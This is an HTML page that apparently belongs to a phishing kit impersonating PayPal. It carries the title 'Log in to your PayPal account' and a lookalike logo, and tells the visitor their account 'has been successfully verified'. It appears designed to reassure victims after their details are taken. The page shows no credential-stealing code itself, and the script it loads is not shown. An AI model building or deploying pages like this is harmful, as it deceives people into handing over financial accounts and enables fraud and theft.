<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
    <title>Log in to your PayPal account</title>
    <link rel="shortcut icon" href="./image/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css"
        integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="./css/all.min.css">
    <script defer src="./script/script.js"></script>
</head>
<body class="verifed__backdrop">
    <div class="palz-mark">
        <img src="./image/palz-mk.png" alt="" class="palz-img">
    </div>
    <div class="container__verified">
        <div class="verified__wrapper">
            <div class="container__message">
                <i class="fa-solid fa-check verified-checkmark"></i>
                <h1 class="verified__heading">Thank You!</h1>
                <p class="verified__paragraph">Your account has been successfully verified.
                     You can now explore all features and enjoy your experience.
                </p>
            </div>
        </div>
    </div>
</body>
</html>
